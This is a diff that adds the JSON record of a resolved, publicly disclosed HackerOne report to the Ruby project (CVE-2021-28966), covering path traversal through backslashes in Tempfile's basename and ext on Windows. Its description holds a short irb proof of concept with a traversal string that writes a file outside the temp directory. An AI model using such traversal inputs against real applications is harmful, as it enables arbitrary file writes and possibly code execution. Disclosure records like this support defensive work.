@@ -1,0 +1,148 @@
+{
+  "id": 1131465,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTMxNDY1",
+  "url": "https://hackerone.com/reports/1131465",
+  "title": "Path traversal in Tempfile on windows OS due to unsanitized backslashes",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-20T19:21:50.073Z",
+  "submitted_at": "2021-03-20T19:21:50.112Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bugdiscloseguys",
+    "url": "/bugdiscloseguys",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-28966"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-04-07T12:46:20.750Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-04-07T12:46:20.668Z",
+  "team_member_agreed_on_going_public_at": "2021-04-07T11:42:25.755Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi team,\n\n##Summary\n\nWe've noticed that both arguments (basename and ext) of Tempfile on Windows are vulnerable to a path traversal which could allow unintentional file creating in arbitrary writable directories. \n\nTempfile often has a user control either by basename or ext (or both). \n\n## PoC\n\n~~~\nirb(main):029:0> Tempfile.open([\"\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Users\\\\rootx\\\\malicious\",\".rb\"])\n=> #<Tempfile:C:/Users/rootx/AppData/Local/Temp\\..\\..\\..\\..\\..\\Users\\rootx\\malicious20210321-22472-fvuodx.rb>\nirb(main):030:0> puts `dir C:\\\\Users\\\\rootx\\\\`\n Volume in drive C has no label.\n Volume Serial Number is C0F2-8D87\n\n Directory of C:\\Users\\rootx\n\n... REDACTED ...\n21-03-2021  00:45                 0 malicious20210321-22472-fvuodx.rb\n... REDACTED ...\n~~~\n\nThe same can be accomplished via ext argument. \n\nThanks,\nHarsh and Rahul,\nHTTPVoid\n\n## Impact\n\nUnintentional file creation in an arbitrary directory. Could potentially cause RCE in RoR applications.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-05-07T11:42:25.840Z",
+  "allow_singular_disclosure_after": -87445506.59535594,
+  "singular_disclosure_allowed": true,
+  "vote_count": 53,
+  "voters": [
+    "jumpydata",
+    "jatindhankhar",
+    "ali_shehab",
+    "zy9ard3",
+    "val_brux",
+    "ninetynine",
+    "th4nu_0x0",
+    "tess",
+    "ali",
+    "shubham_srt",
+    "and 43 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 40462,
+      "category": "researcher",
+      "content": "A short blog on this - https://github.com/httpvoid/writeups/blob/main/Ruby-tempfile-mktmpdir-PT.md",
+      "user": {
+        "id": 50036,
+        "username": "bugdiscloseguys",
+        "name": "Bugdiscloseguys",
+        "bio": "Your neighborhood hacker!",
+        "cleared": false,
+        "verified": true,
+        "website": "https://httpvoid.com",
+        "location": "",
+        "created_at": "2016-01-08T19:44:35.089Z",
+        "url": "https://hackerone.com/bugdiscloseguys",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
